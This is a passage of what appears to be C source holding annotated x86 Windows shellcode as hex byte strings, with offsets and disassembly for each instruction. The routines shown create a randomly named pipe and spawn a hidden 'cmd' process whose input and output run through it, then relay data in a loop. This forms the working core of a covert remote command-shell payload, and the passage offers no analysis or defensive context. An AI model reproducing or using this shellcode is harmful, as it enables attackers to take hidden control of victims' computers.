  /* 08E5 */ "\x56"                                     /* push esi                         */
  /* 08E6 */ "\xe8\x41\xfc\xff\xff"                     /* call 0x52c                       */
  /* 08EB */ "\x59"                                     /* pop ecx                          */
  /* 08EC */ "\x39\x1f"                                 /* cmp [edi], ebx                   */
  /* 08EE */ "\x76\x08"                                 /* jbe 0x8f8                        */
  /* 08F0 */ "\xff\x4d\xfc"                             /* dec dword [ebp-0x4]              */
  /* 08F3 */ "\xe9\x79\xff\xff\xff"                     /* jmp 0x871                        */
  /* 08F8 */ "\x5f"                                     /* pop edi                          */
  /* 08F9 */ "\xc7\x86\xbc\x08\x00\x00\x01\x00\x00\x00" /* mov dword [esi+0x8bc], 0x1       */
  /* 0903 */ "\x5e"                                     /* pop esi                          */
  /* 0904 */ "\x5b"                                     /* pop ebx                          */
  /* 0905 */ "\xc9"                                     /* leave                            */
  /* 0906 */ "\xc3"                                     /* ret                              */
  /* 0907 */ "\x55"                                     /* push ebp                         */
  /* 0908 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 090A */ "\x83\xec\x74"                             /* sub esp, 0x74                    */
  /* 090D */ "\x53"                                     /* push ebx                         */
  /* 090E */ "\x56"                                     /* push esi                         */
  /* 090F */ "\x57"                                     /* push edi                         */
  /* 0910 */ "\x6a\x20"                                 /* push 0x20                        */
  /* 0912 */ "\x59"                                     /* pop ecx                          */
  /* 0913 */ "\x32\xc0"                                 /* xor al, al                       */
  /* 0915 */ "\x8d\x7d\xd0"                             /* lea edi, [ebp-0x30]              */
  /* 0918 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 091A */ "\x6a\x09"                                 /* push 0x9                         */
  /* 091C */ "\x59"                                     /* pop ecx                          */
  /* 091D */ "\xc7\x45\xf0\x5c\x5c\x2e\x5c"             /* mov dword [ebp-0x10], 0x5c2e5c5c */
  /* 0924 */ "\xc7\x45\xf4\x70\x69\x70\x65"             /* mov dword [ebp-0xc], 0x65706970  */
  /* 092B */ "\xc6\x45\xf8\x5c"                         /* mov byte [ebp-0x8], 0x5c         */
  /* 092F */ "\x8d\x75\xf0"                             /* lea esi, [ebp-0x10]              */
  /* 0932 */ "\x8d\x7d\xd0"                             /* lea edi, [ebp-0x30]              */
  /* 0935 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 0937 */ "\x8b\x75\x08"                             /* mov esi, [ebp+0x8]               */
  /* 093A */ "\x33\xdb"                                 /* xor ebx, ebx                     */
  /* 093C */ "\xc7\x45\xfc\x63\x6d\x64\x00"             /* mov dword [ebp-0x4], 0x646d63    */
  /* 0943 */ "\xff\x56\x24"                             /* call dword [esi+0x24]            */
  /* 0946 */ "\x89\x45\x08"                             /* mov [ebp+0x8], eax               */
  /* 0949 */ "\x33\xc9"                                 /* xor ecx, ecx                     */
  /* 094B */ "\x8b\x45\x08"                             /* mov eax, [ebp+0x8]               */
  /* 094E */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 0950 */ "\x6a\x1a"                                 /* push 0x1a                        */
  /* 0952 */ "\x5f"                                     /* pop edi                          */
  /* 0953 */ "\xf7\xf7"                                 /* div edi                          */
  /* 0955 */ "\xc1\x6d\x08\x02"                         /* shr dword [ebp+0x8], 0x2         */
  /* 0959 */ "\x80\xc2\x61"                             /* add dl, 0x61                     */
  /* 095C */ "\x88\x54\x0d\xd9"                         /* mov [ebp+ecx-0x27], dl           */
  /* 0960 */ "\x41"                                     /* inc ecx                          */
  /* 0961 */ "\x83\xf9\x08"                             /* cmp ecx, 0x8                     */
  /* 0964 */ "\x72\xe5"                                 /* jb 0x94b                         */
  /* 0966 */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 0969 */ "\x50"                                     /* push eax                         */
  /* 096A */ "\x53"                                     /* push ebx                         */
  /* 096B */ "\x53"                                     /* push ebx                         */
  /* 096C */ "\x53"                                     /* push ebx                         */
  /* 096D */ "\x33\xff"                                 /* xor edi, edi                     */
  /* 096F */ "\x47"                                     /* inc edi                          */
  /* 0970 */ "\x57"                                     /* push edi                         */
  /* 0971 */ "\x53"                                     /* push ebx                         */
  /* 0972 */ "\x68\x01\x00\x00\x40"                     /* push 0x40000001                  */
  /* 0977 */ "\x8d\x45\xd0"                             /* lea eax, [ebp-0x30]              */
  /* 097A */ "\x50"                                     /* push eax                         */
  /* 097B */ "\xc7\x45\xf0\x0c\x00\x00\x00"             /* mov dword [ebp-0x10], 0xc        */
  /* 0982 */ "\x89\x5d\xf4"                             /* mov [ebp-0xc], ebx               */
  /* 0985 */ "\x89\x7d\xf8"                             /* mov [ebp-0x8], edi               */
  /* 0988 */ "\xff\x16"                                 /* call dword [esi]                 */
  /* 098A */ "\x89\x86\x94\x08\x00\x00"                 /* mov [esi+0x894], eax             */
  /* 0990 */ "\x83\xf8\xff"                             /* cmp eax, 0xffffffff              */
  /* 0993 */ "\x0f\x84\xe4\x00\x00\x00"                 /* jz 0xa7d                         */
  /* 0999 */ "\x53"                                     /* push ebx                         */
  /* 099A */ "\x8d\x55\xf0"                             /* lea edx, [ebp-0x10]              */
  /* 099D */ "\x52"                                     /* push edx                         */
  /* 099E */ "\x8d\x86\x98\x08\x00\x00"                 /* lea eax, [esi+0x898]             */
  /* 09A4 */ "\x8d\x8e\x9c\x08\x00\x00"                 /* lea ecx, [esi+0x89c]             */
  /* 09AA */ "\x50"                                     /* push eax                         */
  /* 09AB */ "\x51"                                     /* push ecx                         */
  /* 09AC */ "\xff\x56\x04"                             /* call dword [esi+0x4]             */
  /* 09AF */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 09B1 */ "\x0f\x84\xbd\x00\x00\x00"                 /* jz 0xa74                         */
  /* 09B7 */ "\x53"                                     /* push ebx                         */
  /* 09B8 */ "\x53"                                     /* push ebx                         */
  /* 09B9 */ "\x6a\x03"                                 /* push 0x3                         */
  /* 09BB */ "\x8d\x45\xf0"                             /* lea eax, [ebp-0x10]              */
  /* 09BE */ "\x50"                                     /* push eax                         */
  /* 09BF */ "\x53"                                     /* push ebx                         */
  /* 09C0 */ "\x68\x00\x00\x00\x40"                     /* push 0x40000000                  */
  /* 09C5 */ "\x8d\x45\xd0"                             /* lea eax, [ebp-0x30]              */
  /* 09C8 */ "\x50"                                     /* push eax                         */
  /* 09C9 */ "\xff\x56\x08"                             /* call dword [esi+0x8]             */
  /* 09CC */ "\x89\x86\xa0\x08\x00\x00"                 /* mov [esi+0x8a0], eax             */
  /* 09D2 */ "\x83\xf8\xff"                             /* cmp eax, 0xffffffff              */
  /* 09D5 */ "\x0f\x84\x87\x00\x00\x00"                 /* jz 0xa62                         */
  /* 09DB */ "\x53"                                     /* push ebx                         */
  /* 09DC */ "\x57"                                     /* push edi                         */
  /* 09DD */ "\x57"                                     /* push edi                         */
  /* 09DE */ "\x53"                                     /* push ebx                         */
  /* 09DF */ "\xff\x56\x20"                             /* call dword [esi+0x20]            */
  /* 09E2 */ "\x6a\x44"                                 /* push 0x44                        */
  /* 09E4 */ "\x5a"                                     /* pop edx                          */
  /* 09E5 */ "\x89\x86\xa8\x08\x00\x00"                 /* mov [esi+0x8a8], eax             */
  /* 09EB */ "\x32\xc0"                                 /* xor al, al                       */
  /* 09ED */ "\x8b\xca"                                 /* mov ecx, edx                     */
  /* 09EF */ "\x8d\x7d\x8c"                             /* lea edi, [ebp-0x74]              */
  /* 09F2 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 09F4 */ "\x8b\x86\x9c\x08\x00\x00"                 /* mov eax, [esi+0x89c]             */
  /* 09FA */ "\x89\x45\xc4"                             /* mov [ebp-0x3c], eax              */
  /* 09FD */ "\x8b\x86\xa0\x08\x00\x00"                 /* mov eax, [esi+0x8a0]             */
  /* 0A03 */ "\x89\x45\xcc"                             /* mov [ebp-0x34], eax              */
  /* 0A06 */ "\x89\x45\xc8"                             /* mov [ebp-0x38], eax              */
  /* 0A09 */ "\x8d\xbe\xac\x08\x00\x00"                 /* lea edi, [esi+0x8ac]             */
  /* 0A0F */ "\x57"                                     /* push edi                         */
  /* 0A10 */ "\x8d\x45\x8c"                             /* lea eax, [ebp-0x74]              */
  /* 0A13 */ "\x50"                                     /* push eax                         */
  /* 0A14 */ "\x53"                                     /* push ebx                         */
  /* 0A15 */ "\x53"                                     /* push ebx                         */
  /* 0A16 */ "\x68\x00\x00\x00\x08"                     /* push 0x8000000                   */
  /* 0A1B */ "\x6a\x01"                                 /* push 0x1                         */
  /* 0A1D */ "\x53"                                     /* push ebx                         */
  /* 0A1E */ "\x53"                                     /* push ebx                         */
  /* 0A1F */ "\x8d\x45\xfc"                             /* lea eax, [ebp-0x4]               */
  /* 0A22 */ "\x50"                                     /* push eax                         */
  /* 0A23 */ "\x53"                                     /* push ebx                         */
  /* 0A24 */ "\x89\x55\x8c"                             /* mov [ebp-0x74], edx              */
  /* 0A27 */ "\xc7\x45\xb8\x00\x01\x00\x00"             /* mov dword [ebp-0x48], 0x100      */
  /* 0A2E */ "\xff\x56\x18"                             /* call dword [esi+0x18]            */
  /* 0A31 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 0A33 */ "\x74\x1b"                                 /* jz 0xa50                         */
  /* 0A35 */ "\x56"                                     /* push esi                         */
  /* 0A36 */ "\xe8\x08\xfe\xff\xff"                     /* call 0x843                       */
  /* 0A3B */ "\x59"                                     /* pop ecx                          */
  /* 0A3C */ "\x53"                                     /* push ebx                         */
  /* 0A3D */ "\xff\x37"                                 /* push dword [edi]                 */
  /* 0A3F */ "\xff\x56\x1c"                             /* call dword [esi+0x1c]            */
  /* 0A42 */ "\xff\xb6\xb0\x08\x00\x00"                 /* push dword [esi+0x8b0]           */
  /* 0A48 */ "\xff\x56\x2c"                             /* call dword [esi+0x2c]            */
  /* 0A4B */ "\xff\x37"                                 /* push dword [edi]                 */
  /* 0A4D */ "\xff\x56\x2c"                             /* call dword [esi+0x2c]            */
  /* 0A50 */ "\xff\xb6\xa8\x08\x00\x00"                 /* push dword [esi+0x8a8]           */
  /* 0A56 */ "\xff\x56\x2c"                             /* call dword [esi+0x2c]            */
  /* 0A59 */ "\xff\xb6\xa0\x08\x00\x00"                 /* push dword [esi+0x8a0]           */
  /* 0A5F */ "\xff\x56\x2c"                             /* call dword [esi+0x2c]            */
  /* 0A62 */ "\xff\xb6\x98\x08\x00\x00"                 /* push dword [esi+0x898]           */
  /* 0A68 */ "\xff\x56\x2c"                             /* call dword [esi+0x2c]            */
  /* 0A6B */ "\xff\xb6\x9c\x08\x00\x00"                 /* push dword [esi+0x89c]           */
  /* 0A71 */ "\xff\x56\x2c"                             /* call dword [esi+0x2c]            */
  /* 0A74 */ "\xff\xb6\x94\x08\x00\x00"                 /* push dword [esi+0x894]           */
  /* 0A7A */ "\xff\x56\x2c"                             /* call dword [esi+0x2c]            */
  /* 0A7D */ "\x56"                                     /* push esi                         */
  /* 0A7E */ "\x89\x5e\x70"                             /* mov [esi+0x70], ebx              */
  /* 0A81 */ "\xe8\xa6\xfa\xff\xff"                     /* call 0x52c                       */
  /* 0A86 */ "\x59"                                     /* pop ecx                          */
  /* 0A87 */ "\x5f"                                     /* pop edi                          */
  /* 0A88 */ "\x5e"                                     /* pop esi                          */
  /* 0A89 */ "\x5b"                                     /* pop ebx                          */
  /* 0A8A */ "\xc9"                                     /* leave                            */
  /* 0A8B */ "\xc3"                                     /* ret                              */
  /* 0A8C */ "\x55"                                     /* push ebp                         */
  /* 0A8D */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 0A8F */ "\x51"                                     /* push ecx                         */
  /* 0A90 */ "\x53"                                     /* push ebx                         */
  /* 0A91 */ "\x56"                                     /* push esi                         */
  /* 0A92 */ "\x8b\x75\x08"                             /* mov esi, [ebp+0x8]               */
  /* 0A95 */ "\x57"                                     /* push edi                         */
  /* 0A96 */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 0A98 */ "\x50"                                     /* push eax                         */
  /* 0A99 */ "\x50"                                     /* push eax                         */
  /* 0A9A */ "\x6a\x03"                                 /* push 0x3                         */
  /* 0A9C */ "\x50"                                     /* push eax                         */
  /* 0A9D */ "\x6a\x01"                                 /* push 0x1                         */
  /* 0A9F */ "\x68\x00\x00\x00\x80"                     /* push 0x80000000                  */
  /* 0AA4 */ "\x8d\x9e\x84\x00\x00\x00"                 /* lea ebx, [esi+0x84]              */
  /* 0AAA */ "\x53"                                     /* push ebx                         */
  /* 0AAB */ "\xff\x56\x08"                             /* call dword [esi+0x8]             */
  /* 0AAE */ "\x89\x45\x08"                             /* mov [ebp+0x8], eax               */
  /* 0AB1 */ "\xff\x56\x28"                             /* call dword [esi+0x28]            */
  /* 0AB4 */ "\x8d\x7e\x70"                             /* lea edi, [esi+0x70]              */
  /* 0AB7 */ "\x89\x86\x80\x00\x00\x00"                 /* mov [esi+0x80], eax              */
  /* 0ABD */ "\xc7\x07\x04\x00\x00\x00"                 /* mov dword [edi], 0x4             */
  /* 0AC3 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 0AC5 */ "\x75\x0d"                                 /* jnz 0xad4                        */
  /* 0AC7 */ "\x53"                                     /* push ebx                         */
  /* 0AC8 */ "\xff\x75\x08"                             /* push dword [ebp+0x8]             */
  /* 0ACB */ "\xc7\x07\x0c\x00\x00\x00"                 /* mov dword [edi], 0xc             */
  /* 0AD1 */ "\xff\x56\x38"                             /* call dword [esi+0x38]            */
  /* 0AD4 */ "\x56"                                     /* push esi                         */
  /* 0AD5 */ "\xe8\x52\xfa\xff\xff"                     /* call 0x52c                       */
  /* 0ADA */ "\x83\x7d\x08\xff"                         /* cmp dword [ebp+0x8], 0xffffffff  */
  /* 0ADE */ "\x59"                                     /* pop ecx                          */
  /* 0ADF */ "\x74\x39"                                 /* jz 0xb1a                         */
  /* 0AE1 */ "\xbb\x00\x08\x00\x00"                     /* mov ebx, 0x800                   */
  /* 0AE6 */ "\xeb\x06"                                 /* jmp 0xaee                        */
  /* 0AE8 */ "\x83\x7d\xfc\x00"                         /* cmp dword [ebp-0x4], 0x0         */
  /* 0AEC */ "\x75\x26"                                 /* jnz 0xb14                        */
  /* 0AEE */ "\x6a\x00"                                 /* push 0x0                         */
  /* 0AF0 */ "\x57"                                     /* push edi                         */
  /* 0AF1 */ "\x53"                                     /* push ebx                         */
  /* 0AF2 */ "\x8d\x86\x80\x00\x00\x00"                 /* lea eax, [esi+0x80]              */
  /* 0AF8 */ "\x50"                                     /* push eax                         */
  /* 0AF9 */ "\xff\x75\x08"                             /* push dword [ebp+0x8]             */
  /* 0AFC */ "\xff\x56\x10"                             /* call dword [esi+0x10]            */
  /* 0AFF */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 0B01 */ "\x39\x07"                                 /* cmp [edi], eax                   */
  /* 0B03 */ "\x56"                                     /* push esi                         */
  /* 0B04 */ "\x0f\x94\xc0"                             /* setz al                          */
  /* 0B07 */ "\x89\x45\xfc"                             /* mov [ebp-0x4], eax               */
  /* 0B0A */ "\xe8\x1d\xfa\xff\xff"                     /* call 0x52c                       */
  /* 0B0F */ "\x59"                                     /* pop ecx                          */
  /* 0B10 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 0B12 */ "\x74\xd4"                                 /* jz 0xae8                         */
  /* 0B14 */ "\xff\x75\x08"                             /* push dword [ebp+0x8]             */
  /* 0B17 */ "\xff\x56\x2c"                             /* call dword [esi+0x2c]            */
  /* 0B1A */ "\x5f"                                     /* pop edi                          */
  /* 0B1B */ "\x5e"                                     /* pop esi                          */
  /* 0B1C */ "\x5b"                                     /* pop ebx                          */
  /* 0B1D */ "\xc9"                                     /* leave                            */
  /* 0B1E */ "\xc3"                                     /* ret                              */
  /* 0B1F */ "\x55"                                     /* push ebp                         */
  /* 0B20 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 0B22 */ "\x51"                                     /* push ecx                         */
  /* 0B23 */ "\x53"                                     /* push ebx                         */
  /* 0B24 */ "\x56"                                     /* push esi                         */
  /* 0B25 */ "\x8b\x75\x08"                             /* mov esi, [ebp+0x8]               */
  /* 0B28 */ "\x57"                                     /* push edi                         */
  /* 0B29 */ "\x33\xdb"                                 /* xor ebx, ebx                     */
  /* 0B2B */ "\x53"                                     /* push ebx                         */
  /* 0B2C */ "\x53"                                     /* push ebx                         */
  /* 0B2D */ "\x6a\x01"                                 /* push 0x1                         */
  /* 0B2F */ "\x53"                                     /* push ebx                         */
  /* 0B30 */ "\x53"                                     /* push ebx                         */
  /* 0B31 */ "\x68\x00\x00\x00\x40"                     /* push 0x40000000                  */
  /* 0B36 */ "\x8d\x86\x84\x00\x00\x00"                 /* lea eax, [esi+0x84]              */
  /* 0B3C */ "\x50"                                     /* push eax                         */
  /* 0B3D */ "\xff\x56\x08"                             /* call dword [esi+0x8]             */
  /* 0B40 */ "\x89\x45\x08"                             /* mov [ebp+0x8], eax               */
  /* 0B43 */ "\x8d\xbe\x80\x00\x00\x00"                 /* lea edi, [esi+0x80]              */
  /* 0B49 */ "\xff\x56\x28"                             /* call dword [esi+0x28]            */
  /* 0B4C */ "\x56"                                     /* push esi                         */
  /* 0B4D */ "\x89\x07"                                 /* mov [edi], eax                   */
  /* 0B4F */ "\xc7\x46\x70\x04\x00\x00\x00"             /* mov dword [esi+0x70], 0x4        */
  /* 0B56 */ "\xe8\xd1\xf9\xff\xff"                     /* call 0x52c                       */
  /* 0B5B */ "\x83\x7d\x08\xff"                         /* cmp dword [ebp+0x8], 0xffffffff  */
  /* 0B5F */ "\x59"                                     /* pop ecx                          */
  /* 0B60 */ "\x74\x27"                                 /* jz 0xb89                         */
  /* 0B62 */ "\xeb\x14"                                 /* jmp 0xb78                        */
  /* 0B64 */ "\x8b\x46\x70"                             /* mov eax, [esi+0x70]              */
  /* 0B67 */ "\x3b\xc3"                                 /* cmp eax, ebx                     */
  /* 0B69 */ "\x74\x18"                                 /* jz 0xb83                         */
  /* 0B6B */ "\x53"                                     /* push ebx                         */
  /* 0B6C */ "\x8d\x4d\xfc"                             /* lea ecx, [ebp-0x4]               */
  /* 0B6F */ "\x51"                                     /* push ecx                         */
  /* 0B70 */ "\x50"                                     /* push eax                         */
  /* 0B71 */ "\x57"                                     /* push edi                         */
  /* 0B72 */ "\xff\x75\x08"                             /* push dword [ebp+0x8]             */
  /* 0B75 */ "\xff\x56\x0c"                             /* call dword [esi+0xc]             */
  /* 0B78 */ "\x56"                                     /* push esi                         */
  /* 0B79 */ "\xe8\x63\xfa\xff\xff"                     /* call 0x5e1                       */
  /* 0B7E */ "\x59"                                     /* pop ecx                          */
  /* 0B7F */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 0B81 */ "\x74\xe1"                                 /* jz 0xb64                         */
  /* 0B83 */ "\xff\x75\x08"                             /* push dword [ebp+0x8]             */
  /* 0B86 */ "\xff\x56\x2c"                             /* call dword [esi+0x2c]            */
  /* 0B89 */ "\x5f"                                     /* pop edi                          */
  /* 0B8A */ "\x5e"                                     /* pop esi                          */
  /* 0B8B */ "\x5b"                                     /* pop ebx                          */
  /* 0B8C */ "\xc9"                                     /* leave                            */
  /* 0B8D */ "\xc3"                                     /* ret                              */
  /* 0B8E */ "\x56"                                     /* push esi                         */
  /* 0B8F */ "\x8b\x74\x24\x08"                         /* mov esi, [esp+0x8]               */
  /* 0B93 */ "\xff\x56\x5c"                             /* call dword [esi+0x5c]            */
  /* 0B96 */ "\xff\x86\xbc\x08\x00\x00"                 /* inc dword [esi+0x8bc]            */
  /* 0B9C */ "\x89\x86\xa4\x08\x00\x00"                 /* mov [esi+0x8a4], eax             */
  /* 0BA2 */ "\x56"                                     /* push esi                         */
  /* 0BA3 */ "\xe8\x29\xfc\xff\xff"                     /* call 0x7d1                       */
  /* 0BA8 */ "\x59"                                     /* pop ecx                          */
  /* 0BA9 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 0BAB */ "\x75\x1d"                                 /* jnz 0xbca                        */
  /* 0BAD */ "\x56"                                     /* push esi                         */
  /* 0BAE */ "\xe8\x2e\xfa\xff\xff"                     /* call 0x5e1                       */
  /* 0BB3 */ "\x59"                                     /* pop ecx                          */
  /* 0BB4 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 0BB6 */ "\x75\x12"                                 /* jnz 0xbca                        */
  /* 0BB8 */ "\x8b\x86\x80\x00\x00\x00"                 /* mov eax, [esi+0x80]              */
  /* 0BBE */ "\x48"                                     /* dec eax                          */
  /* 0BBF */ "\x74\x24"                                 /* jz 0xbe5                         */
  /* 0BC1 */ "\x48"                                     /* dec eax                          */
  /* 0BC2 */ "\x74\x19"                                 /* jz 0xbdd                         */
  /* 0BC4 */ "\x48"                                     /* dec eax                          */
  /* 0BC5 */ "\x74\x0e"                                 /* jz 0xbd5                         */
  /* 0BC7 */ "\x48"                                     /* dec eax                          */
  /* 0BC8 */ "\x75\xd8"                                 /* jnz 0xba2                        */
  /* 0BCA */ "\xff\xb6\xa4\x08\x00\x00"                 /* push dword [esi+0x8a4]           */
  /* 0BD0 */ "\xff\x56\x2c"                             /* call dword [esi+0x2c]            */
  /* 0BD3 */ "\x5e"                                     /* pop esi                          */
  /* 0BD4 */ "\xc3"                                     /* ret                              */
  /* 0BD5 */ "\x56"                                     /* push esi                         */
  /* 0BD6 */ "\xe8\xb1\xfe\xff\xff"                     /* call 0xa8c                       */
  /* 0BDB */ "\xeb\x0e"                                 /* jmp 0xbeb                        */
  /* 0BDD */ "\x56"                                     /* push esi                         */
  /* 0BDE */ "\xe8\x3c\xff\xff\xff"                     /* call 0xb1f                       */
  /* 0BE3 */ "\xeb\x06"                                 /* jmp 0xbeb                        */
  /* 0BE5 */ "\x56"                                     /* push esi                         */
  /* 0BE6 */ "\xe8\x1c\xfd\xff\xff"                     /* call 0x907                       */
  /* 0BEB */ "\x59"                                     /* pop ecx                          */
  /* 0BEC */ "\xeb\xb4"                                 /* jmp 0xba2                        */
  /* 0BEE */ "\x55"                                     /* push ebp                         */
  /* 0BEF */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 0BF1 */ "\x56"                                     /* push esi                         */
  /* 0BF2 */ "\x8b\x75\x10"                             /* mov esi, [ebp+0x10]              */
  /* 0BF5 */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 0BF7 */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 0BF9 */ "\x83\xfe\x40"                             /* cmp esi, 0x40                    */
  /* 0BFC */ "\x73\x35"                                 /* jae 0xc33                        */
  /* 0BFE */ "\x85\xf6"                                 /* test esi, esi                    */
  /* 0C00 */ "\x75\x08"                                 /* jnz 0xc0a                        */
  /* 0C02 */ "\x8b\x45\x08"                             /* mov eax, [ebp+0x8]               */
  /* 0C05 */ "\x8b\x55\x0c"                             /* mov edx, [ebp+0xc]               */
  /* 0C08 */ "\xeb\x29"                                 /* jmp 0xc33                        */
  /* 0C0A */ "\x8b\x55\x08"                             /* mov edx, [ebp+0x8]               */
  /* 0C0D */ "\x8b\xce"                                 /* mov ecx, esi                     */
  /* 0C0F */ "\x83\xfe\x20"                             /* cmp esi, 0x20                    */
  /* 0C12 */ "\x73\x18"                                 /* jae 0xc2c                        */
  /* 0C14 */ "\x57"                                     /* push edi                         */
  /* 0C15 */ "\x8b\x7d\x0c"                             /* mov edi, [ebp+0xc]               */
  /* 0C18 */ "\x8b\xc2"                                 /* mov eax, edx                     */
  /* 0C1A */ "\xd3\xe0"                                 /* shl eax, cl                      */
  /* 0C1C */ "\x6a\x20"                                 /* push 0x20                        */
  /* 0C1E */ "\x59"                                     /* pop ecx                          */
  /* 0C1F */ "\x2b\xce"                                 /* sub ecx, esi                     */
  /* 0C21 */ "\xd3\xea"                                 /* shr edx, cl                      */
  /* 0C23 */ "\x8b\xce"                                 /* mov ecx, esi                     */
  /* 0C25 */ "\xd3\xe7"                                 /* shl edi, cl                      */
  /* 0C27 */ "\x0b\xd7"                                 /* or edx, edi                      */
  /* 0C29 */ "\x5f"                                     /* pop edi                          */
  /* 0C2A */ "\xeb\x07"                                 /* jmp 0xc33                        */
  /* 0C2C */ "\x83\xe1\x1f"                             /* and ecx, 0x1f                    */
  /* 0C2F */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 0C31 */ "\xd3\xe2"                                 /* shl edx, cl                      */
  /* 0C33 */ "\x5e"                                     /* pop esi                          */
  /* 0C34 */ "\x5d"                                     /* pop ebp                          */
  /* 0C35 */ "\xc3"                                     /* ret                              */
  /* 0C36 */ "\x55"                                     /* push ebp                         */
  /* 0C37 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 0C39 */ "\x57"                                     /* push edi                         */
  /* 0C3A */ "\x8b\x7d\x10"                             /* mov edi, [ebp+0x10]              */
  /* 0C3D */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 0C3F */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 0C41 */ "\x83\xff\x40"                             /* cmp edi, 0x40                    */
  /* 0C44 */ "\x73\x36"                                 /* jae 0xc7c                        */
  /* 0C46 */ "\x85\xff"                                 /* test edi, edi                    */
  /* 0C48 */ "\x75\x08"                                 /* jnz 0xc52                        */
  /* 0C4A */ "\x8b\x45\x08"                             /* mov eax, [ebp+0x8]               */
  /* 0C4D */ "\x8b\x55\x0c"                             /* mov edx, [ebp+0xc]               */
  /* 0C50 */ "\xeb\x2a"                                 /* jmp 0xc7c                        */
  /* 0C52 */ "\x8b\xcf"                                 /* mov ecx, edi                     */
  /* 0C54 */ "\x83\xff\x20"                             /* cmp edi, 0x20                    */
  /* 0C57 */ "\x73\x19"                                 /* jae 0xc72                        */
  /* 0C59 */ "\x8b\x45\x08"                             /* mov eax, [ebp+0x8]               */
  /* 0C5C */ "\x56"                                     /* push esi                         */
  /* 0C5D */ "\x8b\x75\x0c"                             /* mov esi, [ebp+0xc]               */
  /* 0C60 */ "\x8b\xd6"                                 /* mov edx, esi                     */
  /* 0C62 */ "\xd3\xe8"                                 /* shr eax, cl                      */
  /* 0C64 */ "\xd3\xea"                                 /* shr edx, cl                      */
  /* 0C66 */ "\x6a\x20"                                 /* push 0x20                        */
  /* 0C68 */ "\x59"                                     /* pop ecx                          */
  /* 0C69 */ "\x2b\xcf"                                 /* sub ecx, edi                     */
  /* 0C6B */ "\xd3\xe6"                                 /* shl esi, cl                      */
  /* 0C6D */ "\x0b\xc6"                                 /* or eax, esi                      */
  /* 0C6F */ "\x5e"                                     /* pop esi                          */
  /* 0C70 */ "\xeb\x0a"                                 /* jmp 0xc7c                        */
  /* 0C72 */ "\x8b\x45\x0c"                             /* mov eax, [ebp+0xc]               */
  /* 0C75 */ "\x83\xe1\x1f"                             /* and ecx, 0x1f                    */
  /* 0C78 */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 0C7A */ "\xd3\xe8"                                 /* shr eax, cl                      */
  /* 0C7C */ "\x5f"                                     /* pop edi                          */
  /* 0C7D */ "\x5d"                                     /* pop ebp                          */
  /* 0C7E */ "\xc3"                                     /* ret                              */
  /* 0C7F */ "\x55"                                     /* push ebp                         */
  /* 0C80 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 0C82 */ "\x56"                                     /* push esi                         */
  /* 0C83 */ "\x57"                                     /* push edi                         */
  /* 0C84 */ "\x6a\x40"                                 /* push 0x40                        */
  /* 0C86 */ "\x58"                                     /* pop eax                          */
  /* 0C87 */ "\x2b\x45\x10"                             /* sub eax, [ebp+0x10]              */
  /* 0C8A */ "\x50"                                     /* push eax                         */
  /* 0C8B */ "\xff\x75\x0c"                             /* push dword [ebp+0xc]             */
  /* 0C8E */ "\xff\x75\x08"                             /* push dword [ebp+0x8]             */
  /* 0C91 */ "\xe8\xa0\xff\xff\xff"                     /* call 0xc36                       */
  /* 0C96 */ "\xff\x75\x10"                             /* push dword [ebp+0x10]            */
  /* 0C99 */ "\x8b\xf0"                                 /* mov esi, eax                     */
  /* 0C9B */ "\xff\x75\x0c"                             /* push dword [ebp+0xc]             */
  /* 0C9E */ "\x8b\xfa"                                 /* mov edi, edx                     */
  /* 0CA0 */ "\xff\x75\x08"                             /* push dword [ebp+0x8]             */
  /* 0CA3 */ "\xe8\x46\xff\xff\xff"                     /* call 0xbee                       */
  /* 0CA8 */ "\x83\xc4\x18"                             /* add esp, 0x18                    */
  /* 0CAB */ "\x0b\xc6"                                 /* or eax, esi                      */
  /* 0CAD */ "\x0b\xd7"                                 /* or edx, edi                      */
  /* 0CAF */ "\x5f"                                     /* pop edi                          */
  /* 0CB0 */ "\x5e"                                     /* pop esi                          */
  /* 0CB1 */ "\x5d"                                     /* pop ebp                          */
  /* 0CB2 */ "\xc3"                                     /* ret                              */
  /* 0CB3 */ "\x55"                                     /* push ebp                         */
  /* 0CB4 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 0CB6 */ "\x51"                                     /* push ecx                         */
  /* 0CB7 */ "\x51"                                     /* push ecx                         */
  /* 0CB8 */ "\x83\x65\xf8\x00"                         /* and dword [ebp-0x8], 0x0         */
  /* 0CBC */ "\x83\x65\xfc\x00"                         /* and dword [ebp-0x4], 0x0         */
  /* 0CC0 */ "\x53"                                     /* push ebx                         */
  /* 0CC1 */ "\x56"                                     /* push esi                         */
  /* 0CC2 */ "\x57"                                     /* push edi                         */
  /* 0CC3 */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 0CC6 */ "\x0f\xb6\x1f"                             /* movzx ebx, byte [edi]            */
  /* 0CC9 */ "\x33\xf6"                                 /* xor esi, esi                     */
  /* 0CCB */ "\x46"                                     /* inc esi                          */
  /* 0CCC */ "\xf6\xc3\x01"                             /* test bl, 0x1                     */
  /* 0CCF */ "\x74\x16"                                 /* jz 0xce7                         */
  /* 0CD1 */ "\x8d\x46\xff"                             /* lea eax, [esi-0x1]               */
